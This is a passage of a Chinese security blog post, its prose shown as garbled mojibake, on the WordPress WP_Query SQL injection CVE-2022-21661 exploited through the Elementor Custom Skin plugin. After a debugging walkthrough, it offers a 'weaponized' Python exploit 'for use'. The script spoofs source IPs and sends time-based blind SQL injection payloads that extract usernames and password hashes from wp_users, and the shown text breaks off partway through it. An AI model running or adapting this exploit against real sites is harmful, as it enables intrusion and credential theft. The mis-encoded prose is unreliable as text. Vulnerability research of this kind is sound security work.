<p>å¯¹äºæ¯æ¬¡çš„æ“ä½œï¼Œwordpressé€šè¿‡has_actionæ–¹æ³•ä¸¥æ ¼æ£€æŸ¥è¯¥actionæ˜¯å¦å­˜åœ¨äºwordpressè‡ªå¸¦çš„actionåˆ—è¡¨ä¸­ï¼ˆåŒ…æ‹¬éœ€è¦adminæƒé™ä»¥åŠæ— éœ€adminæƒé™çš„æ“ä½œï¼‰ã€‚å› æ­¤ï¼Œç”¨æˆ·æ— æ³•ç›´æ¥æŒ‡å®šä¸€ä¸ªä¸å­˜åœ¨åˆ—è¡¨ä¸­çš„æ¶æ„actionï¼Œä»è€Œä¸€å®šç¨‹åº¦ä¸Šä¿è¯äº†å®‰å…¨æ€§ã€‚</p>
<p>æœ€å¼€å§‹æˆ‘å°è¯•ç¼–å†™ä¸€ä¸ªæœ€ç®€å•çš„POCå»éªŒè¯æ¼æ´ã€‚é€šå¸¸æƒ…å†µä¸‹ï¼Œæˆ‘è®¤ä¸ºæœ€ç®€å•çš„æ–¹å¼å°±æ˜¯è‡ªå·±æ³¨å†Œä¸€ä¸ªæ¶æ„çš„æ–¹æ³•testï¼Œåœ¨è¯¥æ–¹æ³•ä¸­ç›´æ¥å°†requestçš„å‚æ•°ä½œä¸ºè¾“å…¥å®ä¾‹åŒ–WP_Queryå‡½æ•°ã€‚åœ¨wordpressä¸­ï¼Œå¯ä»¥é€šè¿‡ add_action()æ–¹æ³•å°†å‡½æ•°hookåˆ°æŒ‡å®šçš„actionä¸Šï¼Œä½¿å¾—admin-ajax.phpé¡µé¢æ”¶åˆ°è¯¥actionè¯·æ±‚åå¯ä»¥è°ƒç”¨æŒ‡å®šçš„æ–¹æ³•ã€‚</p>


<p>è¿™æ˜¯å…ˆçŸ¥ç¤¾åŒºä¸€ä¸ªå¸ˆå‚…ç»™å‡ºçš„éªŒè¯æ–¹æ³•ï¼Œåœ¨admin-ajax.phpä¸­æ·»åŠ è¯¥ä»£ç ã€‚</p>
<p>è¿™ç§æ–¹å¼å¾ˆå®¹æ˜“å°±æ‰“é€šäº†ï¼Œè¿™é‡Œæˆ‘å°±ä¸è¿‡å¤šèµ˜è¿°äº†ã€‚</p>
<img src="/2022/02/23/CVE-2022-21661/image-20220310134829926.png" class="" title="image-20220310134829926">

<h1 id="æ­¦å™¨åŒ–åˆ©ç”¨"><a href="#æ­¦å™¨åŒ–åˆ©ç”¨" class="headerlink" title="æ­¦å™¨åŒ–åˆ©ç”¨"></a>æ­¦å™¨åŒ–åˆ©ç”¨</h1><h2 id="æ’ä»¶å®‰è£…"><a href="#æ’ä»¶å®‰è£…" class="headerlink" title="æ’ä»¶å®‰è£…"></a>æ’ä»¶å®‰è£…</h2><p>åŸä»¥ä¸ºæ­¦å™¨åŒ–åˆ©ç”¨æ˜¯æœ€å®¹æ˜“çš„ä¸€éƒ¨ï¼Œä½†å‡¡æ‰“é€šäº†ä¹‹ååé¢å¯¹äºæ’ä»¶çš„æ”»å‡»åº”è¯¥æ˜¯æ‰‹åˆ°æ“’æ¥ï¼Œäº‹å®ä¸Šå‘ç°æˆ‘æƒ³é”™äº†ã€‚æ•´ä¸€ä¸ªè¿‡ç¨‹ç»å†äº†è¯¸å¤šéº»çƒ¦ã€‚</p>
<p>æ ¹æ®zerodayinitiativeè®ºå›çš„è¯´æ³•ï¼Œä»–ä»¬å‘ç°ç›®å‰å­˜åœ¨å¯ä»¥è§¦å‘è¯¥æ¼æ´çš„æœ€æµè¡Œçš„æ’ä»¶å«Elementor custom skinã€‚è¯¥æ’ä»¶æ˜¯wordpressæ’ä»¶elementorçš„é™„å±æ’ä»¶ï¼Œä½œç”¨æ˜¯è‡ªå®šä¹‰ä¸€éƒ¨åˆ†é¡µé¢çš„æ ·å¼ã€‚</p>
<img src="/2022/02/23/CVE-2022-21661/image-20220310124411147.png" class="" title="image-20220310124411147">

<p>å› æ­¤ï¼Œæˆ‘æ‰“ç®—ä»è¯¥æ’ä»¶å…¥æ‰‹ï¼Œå°è¯•å†™ä¸€ä¸ªé’ˆå¯¹äºè¯¥æ’ä»¶çš„æ¼æ´åˆ©ç”¨è„šæœ¬ã€‚</p>
<p>æœ€å¼€å§‹æˆ‘ç›´æ¥åœ¨wordpressçš„åº”ç”¨å•†åº—ä¸­å®‰è£…äº†è¯¥æ’ä»¶ï¼Œç„¶è€Œå‘ç°è¯¥æ’ä»¶æŠ¥é”™æç¤ºè¯´éœ€è¦å®‰è£…elementorå’Œelementor proæ‰èƒ½è¿è¡Œã€‚äºæ˜¯æˆ‘åˆå®‰è£…äº†elementoræ’ä»¶ï¼Œä½†ä»æ—§æç¤ºç›¸åŒçš„é”™è¯¯ã€‚ç»è¿‡æŸ¥è¯¢æˆ‘æ‰å‘ç°ï¼Œelementor proå®é™…ä¸Šæ˜¯elementorçš„é™„å±æ’ä»¶ï¼Œåœ¨è´­ä¹°äº†proä¹‹åä»æ—§ä¸èƒ½å¸è½½elementoræ’ä»¶å› ä¸ºå…¶åŒ…å«äº†proæ‰€éœ€è¦çš„ä¸»ä½“åŠŸèƒ½ï¼Œè€ŒElementor custom skinåˆæ˜¯éœ€è¦proæ‰èƒ½å¤Ÿå¯ç”¨çš„åŠŸèƒ½ã€‚</p>
<p>äºæ˜¯æˆ‘å»ç¬¬ä¸‰æ–¹å¹³å°ä¸‹è½½äº†elementorå’Œelementor proçš„å®‰è£…åŒ…ï¼Œåœ¨wordpressè¿›è¡Œå®‰è£…ï¼Œç°åœ¨å‘ç°Elementor custom skinçš„åŠŸèƒ½ç»ˆäºèƒ½å¤Ÿå¯ç”¨äº†ã€‚</p>
<img src="/2022/02/23/CVE-2022-21661/image-20220310133738089.png" class="" title="image-20220310133738089">

<p>åˆ°æ­¤æ’ä»¶ç®—æ˜¯å®‰è£…å®Œæˆã€‚æ¥ç€æˆ‘ä»¬å¼€å§‹è°ƒè¯•ã€‚</p>
<h2 id="å°è¯•æ‰“é€š"><a href="#å°è¯•æ‰“é€š" class="headerlink" title="å°è¯•æ‰“é€š"></a>å°è¯•æ‰“é€š</h2><p>å®‰è£…å¥½æ’ä»¶ä¹‹åæˆ‘ç›´æ¥å°è¯•ç”¨åŸå…ˆçš„payloadå»æ‰“ã€‚ç„¶è€Œå¤±è´¥äº†ï¼Œæ¯æ¬¡æ‰“è¿‡å»é¡µé¢éƒ½åªæ˜¾ç¤ºä¸€ä¸ª0ã€‚</p>
<p>è°ƒè¯•çš„è¿‡ç¨‹å½“ä¸­ï¼Œæˆ‘è§‚å¯Ÿäº†æ’ä»¶çš„æ„é€ å‡½æ•°ï¼Œç ”ç©¶äº†ä¸€ä¸‹wordpressæ’ä»¶ä¸­actionçš„è½½å…¥æœºåˆ¶ã€‚</p>
<p>ä¸€å¼€å§‹æˆ‘ä»¥ä¸ºæ¯æ¬¡å®‰è£…æ’ä»¶çš„æ—¶å€™ä¼šå°†æ’ä»¶ä¸­éœ€è¦hookçš„actionç›´æ¥å†™å…¥åˆ°æœ¬åœ°ä¿å­˜actionçš„æ–‡ä»¶ï¼Œåæ¥å‘ç°å¹¶ä¸æ˜¯ï¼Œé™¤äº†wordpressæ ¸å¿ƒç»„ä»¶ä¸­è‡ªå¸¦çš„actionï¼Œæ‰€æœ‰æ’ä»¶ä¸­çš„actionéƒ½æ˜¯åŠ¨æ€è½½å…¥çš„ã€‚wordpressåœ¨æ‰“å¼€é¡µé¢çš„æ—¶å€™ï¼Œä¼šæœ‰ä¸€ä¸ªplugins loadingçš„ç¯èŠ‚ï¼ŒåŠ¨æ€è°ƒç”¨æ‰€æœ‰æ’ä»¶çš„æ„é€ å‡½æ•°ï¼ŒåŒæ—¶å°†å¯¹åº”action hookåˆ°æŒ‡å®šçš„æ–¹æ³•ã€‚</p>
<p>ç»è¿‡ä¸€ç•ªè°ƒè¯•æˆ‘å‘ç°äº†é—®é¢˜æ‰€åœ¨ï¼šæˆ‘ä»¬é¦–å…ˆæ¥çœ‹ä¸€ä¸‹è¿›å…¥åˆ°amin-ajax.phpé¡µé¢ä¸­æ‰§è¡Œçš„æ“ä½œã€‚</p>
<img src="/2022/02/23/CVE-2022-21661/image-20220310135036639-9251439.png" class="" title="image-20220310135036639">

<p>åœ¨171è¡Œactionå˜é‡é¦–å…ˆè·å–åˆ°ç”¨æˆ·urlè¯·æ±‚ä¸­çš„actionå‚æ•°ï¼Œåˆ†åˆ«å°†å…¶æ‹¼æ¥åˆ°æœªç™»å½•ä»¥åŠç™»å½•çŠ¶æ€ä¸‹çš„actionåç§°ä¸­ï¼Œç„¶åè°ƒç”¨has_action()æ–¹æ³•æ¥æ£€æŸ¥wordpressä¸­æ˜¯å¦æœ‰è¯¥actionæ‰€å¯¹åº”çš„å‡½æ•°ï¼Œå¦‚æœæ²¡æœ‰å°±è¿”å›0ã€‚é‚£ä¹ˆç°åœ¨æ˜¾ç„¶æ˜¯æœ€å¼€å§‹ç¬¬ä¸€æ­¥wordpressçš„æ’ä»¶è½½å…¥è¿‡ç¨‹ä¸­å°±æ²¡æœ‰å°†æ“ä½œhookåˆ°è¯¥actionä¸Šé¢ï¼Œäºæ˜¯æˆ‘ä»¬å•æ­¥è°ƒè¯•æŸ¥çœ‹åŸå› ã€‚</p>
<p>æˆ‘ä»¬é¦–å…ˆæŸ¥çœ‹æŠŠadd_action()æ–¹æ³•çš„ä½ç½®ï¼š</p>
<img src="/2022/02/23/CVE-2022-21661/image-20220310140219282-9251467.png" class="" title="image-20220310140219282">

<p>åœ¨init_ajax()æ–¹æ³•ä¸­ï¼Œé€šè¿‡add_actionå°†ecsload action hookåˆ°äº†get_document_dataæ–¹æ³•ä¸Šï¼Œåè€…å°±æ˜¯å­˜åœ¨new WP_Queryè§¦å‘SQLæ³¨å…¥æ¼æ´çš„åœ°æ–¹ã€‚peekä¸€ä¸‹å‘ç°åœ¨æ„é€ å‡½æ•°çš„æœ«å°¾ï¼Œè°ƒç”¨äº†initæ–¹æ³•ã€‚</p>
<img src="/2022/02/23/CVE-2022-21661/image-20220310135520704.png" class="" title="image-20220310135520704">

<p>æˆ‘ä»¬è¿›å…¥åˆ°è¯¥æ’ä»¶çš„æ„é€ å‡½æ•°ä¸­ï¼Œå‘ç°16è¡Œå€˜è‹¥æ²¡æœ‰è®¾ç½®POSTå‚æ•°ecs_ajax_settingsçš„è¯å°±ä¼šç›´æ¥returnä¸ä¼šæ‰§è¡Œåé¢çš„init_ajax()æ“ä½œã€‚è€Œåœ¨ä¹‹å‰çš„è°ƒè¯•è¿‡ç¨‹ä¸­å°±æ˜¯ä»è¿™é‡Œå°±ç›´æ¥returnäº†ã€‚å› æ­¤æˆ‘ä»¬è®¾ç½®ä¸‹ecs_ajax_settingsä¸º1ï¼Œå°±å¯ä»¥åˆ°ä¸‹ä¸€æ­¥äº†ã€‚</p>
<p>è‡³æ­¤æˆ‘å¯ä»¥åˆ¤æ–­æ’ä»¶çš„è½½å…¥å·²ç»æ²¡æœ‰é—®é¢˜äº†ï¼Œå¯ä»¥è¿›è¡Œä¸‹ä¸€æ­¥å°è¯•å»æ‰“é€šã€‚</p>
<p>é¦–å…ˆæˆ‘ä»¬è¿›å…¥åˆ°get_docuement_data()æ–¹æ³•ï¼š</p>
<img src="/2022/02/23/CVE-2022-21661/image-20220310141910867.png" class="" title="image-20220310141910867">

<p>æ‰¾åˆ°å®ä¾‹åŒ–å¯¹è±¡çš„åœ°æ–¹ï¼š</p>
<img src="/2022/02/23/CVE-2022-21661/image-20220310141601482.png" class="" title="image-20220310141601482">

<p>è¿›å…¥åˆ°get_postæ–¹æ³•ï¼š</p>
<img src="/2022/02/23/CVE-2022-21661/image-20220310141632481.png" class="" title="image-20220310141632481">

<p>è¿›å…¥åˆ°get_sqlæ–¹æ³•ï¼š</p>
<img src="/2022/02/23/CVE-2022-21661/image-20220310142141577.png" class="" title="image-20220310142141577">

<p>è¿›å…¥åˆ°get_sql_clausesæ–¹æ³•ï¼š</p>
<img src="/2022/02/23/CVE-2022-21661/image-20220310142226689.png" class="" title="image-20220310142226689">

<p>è¿›å…¥get_sql_for_queryæ–¹æ³•ï¼š</p>
<img src="/2022/02/23/CVE-2022-21661/image-20220310142316362.png" class="" title="image-20220310142316362">

<p>è¿›å…¥clean_queryæ–¹æ³•ï¼š</p>
<img src="/2022/02/23/CVE-2022-21661/image-20220310142425409.png" class="" title="image-20220310142425409">

<p>åœ¨è¿™é‡Œå°±æ˜¯ç»•è¿‡åˆæ³•æ€§æ£€æµ‹çš„åœ°æ–¹ï¼š</p>
<img src="/2022/02/23/CVE-2022-21661/image-20220310142505819.png" class="" title="image-20220310142505819">

<p>å¯ä»¥çœ‹åˆ°æ˜¯èƒ½å¤Ÿé‡æ–°æ‰“é€šçš„ã€‚</p>
<h3 id="æ­¦å™¨åŒ–è„šæœ¬"><a href="#æ­¦å™¨åŒ–è„šæœ¬" class="headerlink" title="æ­¦å™¨åŒ–è„šæœ¬"></a>æ­¦å™¨åŒ–è„šæœ¬</h3><p>ä»¥ä¸‹è´´å‡ºä¸€ä¸ªè„šæœ¬å¯ä¾›ä½¿ç”¨ï¼ˆdnslogçš„æœ‰bugï¼Œå¥ˆä½•ä¸€ç›´å¾ˆå¿™æ‡’å¾—æ”¹äº†ï¼‰ï¼š</p>
<p>CVE-2022-21661 exp.py</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib3</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)</span><br><span class="line"></span><br><span class="line">proxies = <span class="literal">None</span></span><br><span class="line"><span class="comment"># proxies = &#123; &quot;http&quot;: &quot;socks5://127.0.0.1:8080&quot;, &quot;https&quot;: &quot;socks5://127.0.0.1:8080&quot; &#125;</span></span><br><span class="line"></span><br><span class="line">HELPER_MESSAGE = <span class="string">f&quot;&quot;&quot;Example:</span></span><br><span class="line"><span class="string">python <span class="subst">&#123;__file__&#125;</span> --url http://127.0.0.1/ --method getinfo</span></span><br><span class="line"><span class="string">python <span class="subst">&#123;__file__&#125;</span> --url http://127.0.0.1/ --method getuser</span></span><br><span class="line"><span class="string">python <span class="subst">&#123;__file__&#125;</span> --url http://127.0.0.1/ --method dnslog --target example.com --payload select version()</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">USER_AGENT = <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.87 Safari/537.36&quot;</span></span><br><span class="line"></span><br><span class="line">HEADERS = &#123;<span class="string">&quot;User-Agent&quot;</span>: USER_AGENT, <span class="string">&quot;X-Forwarded-For&quot;</span>: <span class="string">&quot;127.0.0.2&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">#å­—å…¸ï¼ŒæŒ‰asciiç å‡åºæ’åˆ—</span></span><br><span class="line">Dic = <span class="string">&quot;$&quot;</span> + string.digits + string.ascii_uppercase + string.ascii_lowercase  <span class="comment"># Wordpressæ•°æ®è¡¨å¯èƒ½ç”¨åˆ°çš„å­—ç¬¦</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># SQLæ—¶é—´ç›²æ³¨çš„å»¶æ—¶é˜ˆå€¼ï¼Œæ ¹æ®è®¾å¤‡ç¯å¢ƒè°ƒæ•´</span></span><br><span class="line">time_threshold = <span class="number">2.5</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gen_fake_ip</span>():</span><br><span class="line">    chars = string.digits</span><br><span class="line">    arr = []</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">        arr.append(<span class="string">&quot;&quot;</span>.join([random.choice(chars) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>)]))</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;.&quot;</span>.join(arr)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_random_name</span>():</span><br><span class="line">    chars = string.ascii_lowercase</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;&quot;</span>.join([random.choice(chars) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>)])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_random_ua</span>():</span><br><span class="line">    <span class="comment"># return ua.random</span></span><br><span class="line">    <span class="keyword">return</span> USER_AGENT</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gen_headers</span>():</span><br><span class="line">    ua = get_random_ua()</span><br><span class="line">    fakeIP = gen_fake_ip()</span><br><span class="line">    headers = &#123;<span class="string">&quot;User-Agent&quot;</span>: ua, <span class="string">&quot;X-Forwarded-For&quot;</span>: fakeIP&#125;</span><br><span class="line">    <span class="keyword">return</span> headers</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">detect_plugin</span>(<span class="params">url</span>):</span><br><span class="line">    url_plugin = url + <span class="string">&quot;/wp-content/plugins/ele-custom-skin/&quot;</span></span><br><span class="line">    headers = gen_headers()</span><br><span class="line">    req = requests.get(url_plugin, headers=headers, proxies=proxies, verify=<span class="literal">False</span>)</span><br><span class="line">    result = re.search(<span class="string">r&quot;&lt;title&gt;.+&lt;/title&gt;&quot;</span>, req.text)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;ele-custom-skin&quot;</span> <span class="keyword">in</span> result.group():  <span class="comment"># æ£€æŸ¥ç›¸å…³å­—æ®µæ˜¯å¦å­˜åœ¨äºæ’ä»¶ç›®å½•</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[+] Elementor Custom Skin Detected!&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[-] Elementor Custom Skin Not Found&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_info</span>(<span class="params">url</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    è·å–wordpressç‰ˆæœ¬ä¿¡æ¯å’Œelementoræ’ä»¶ä¿¡æ¯</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    url_info1 = url</span><br><span class="line">    headers = gen_headers()</span><br><span class="line">    req = requests.get(url_info1, headers=headers, proxies=proxies, verify=<span class="literal">False</span>)</span><br><span class="line">    result = re.search(<span class="string">r&quot;WordPress \d(\.\d)*&quot;</span>, req.text)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(result.group()) != <span class="number">0</span>:</span><br><span class="line">        <span class="built_in">print</span>(result.group())</span><br><span class="line">        detect_plugin(url)</span><br><span class="line">    <span class="keyword">elif</span> <span class="built_in">len</span>(re.search(<span class="string">r&quot;\?ver=\d(\.\d)*&quot;</span>, req.text)) != <span class="number">0</span>:</span><br><span class="line">        result = re.search(<span class="string">r&quot;\?ver=\d(\.\d)*&quot;</span>, req.text)</span><br><span class="line">        result = <span class="string">&quot;[+] WordPress &quot;</span>.join(result.group().strip(<span class="string">&quot;\?ver=&quot;</span>))</span><br><span class="line">        <span class="built_in">print</span>(result)</span><br><span class="line">        detect_plugin(url)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        url_info2 = url + <span class="string">&quot;/feed&quot;</span></span><br><span class="line">        req = requests.get(url_info2, headers=headers, proxies=proxies, verify=<span class="literal">False</span>)</span><br><span class="line">        result = re.search(<span class="string">r&quot;\?v=\d(\.\d)*&quot;</span>, req.text)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(result) != <span class="number">0</span>:</span><br><span class="line">            result = <span class="string">&quot;WordPress &quot;</span>.join(result.group().strip(<span class="string">&quot;\?v=&quot;</span>))</span><br><span class="line">            <span class="built_in">print</span>(result)</span><br><span class="line">            detect_plugin(url)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[-] WordPress Version Not Found!&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">payload_format</span>(<span class="params">current_len,payload,cracking_param</span>):</span><br><span class="line">    <span class="comment"># è¿”å›æ³¨å…¥çš„å­—ç¬¦ä¸²ï¼Œå…¶ä¸­sleepå‚æ•°å¯èƒ½ä¼šå› ä¸ºé˜ˆå€¼ä¸åŒè€Œéœ€è¦ä¿®æ”¹</span></span><br><span class="line">    <span class="keyword">return</span>  &#123;</span><br><span class="line">                <span class="string">&quot;query&quot;</span>: <span class="string">&#x27;&#123;&quot;tax_query&quot;:&#123;&quot;0&quot;:&#123;&quot;field&quot;:&quot;term_taxonomy_id&quot;,&quot;terms&quot;:[&quot;111) or if(left((select binary &#x27;</span>+cracking_param+<span class="string">&#x27; from wordpress.wp_users),&#x27;</span></span><br><span class="line">                + current_len</span><br><span class="line">                + <span class="string">&#x27;)&gt;=\&#x27;&#x27;</span></span><br><span class="line">                + payload</span><br><span class="line">                + <span class="string">&#x27;\&#x27;,sleep(0.5),1)#&quot;]&#125;&#125;&#125;&#x27;</span>,</span><br><span class="line">                <span class="string">&quot;ecs_ajax_settings&quot;</span>: <span class="string">&#x27;&#123;&quot;post_id&quot;:&quot;0&quot;,&quot;current_page&quot;:&quot;0&quot;,&quot;widget_id&quot;:&quot;0&quot;,&quot;theme_id&quot;:&quot;0&quot;,&quot;max_num_pages&quot;:&quot;2&quot;&#125;&#x27;</span>,</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_userlogin</span>(<span class="params">url,cracking_param</span>):</span><br><span class="line"></span><br><span class="line">    headers = gen_headers()</span><br><span class="line">    <span class="comment"># å®šä¹‰user_login/pass</span></span><br><span class="line">    len_login = <span class="number">0</span></span><br><span class="line">    user_login = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Start cracking the <span class="subst">&#123;cracking_param&#125;</span>:&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">        len_login += <span class="number">1</span></span><br><span class="line">        left = <span class="number">0</span></span><br><span class="line">        right = <span class="built_in">len</span>(Dic)</span><br><span class="line">        <span class="comment"># åˆ¤æ–­æ˜¯å¦åˆ°è¾¾å­—ç¬¦ä¸²æœ«å°¾</span></span><br><span class="line">        is_last = <span class="literal">False</span></span><br><span class="line">        <span class="keyword">while</span> (left&lt;=right):</span><br><span class="line">            mid = ((left + right)//<span class="number">2</span>)</span><br><span class="line">            <span class="comment"># å¦‚æœæ˜¯ç‰¹æ®Šç¬¦å·åˆ™åŠ ä¸ŠåŒåæ–œæ </span></span><br><span class="line">            <span class="keyword">if</span> Dic[mid] == <span class="string">&#x27;$&#x27;</span>:</span><br><span class="line">                concat = <span class="string">&quot;\\&quot;</span> + Dic[mid]</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                concat = Dic[mid]</span><br><span class="line">            <span class="comment"># è·å–æ³¨å…¥payload</span></span><br><span class="line">            data = payload_format(<span class="built_in">str</span>(len_login),user_login+concat,cracking_param)</span><br><span class="line">            time1 = time.time()</span><br><span class="line">            res = requests.post(url, headers=headers, data=data)</span><br><span class="line">            time2 = time.time()</span><br><span class="line">            <span class="built_in">print</span>(Dic[mid]+<span class="string">&#x27; &#x27;</span>+<span class="built_in">str</span>(time2 - time1)+<span class="string">&#x27; &#x27;</span>+<span class="built_in">str</span>(left)+<span class="string">&#x27; &#x27;</span>+<span class="built_in">str</span>(right))</span><br><span class="line">            <span class="comment"># å¦‚æœæ—¶é—´é—´éš”å¤§äºé˜ˆå€¼åˆ™è¯´æ˜è¯¥å­—æ®µåœ¨midçš„å³è¾¹</span></span><br><span class="line">            <span class="keyword">if</span> time2 - time1 &gt; time_threshold:</span><br><span class="line">                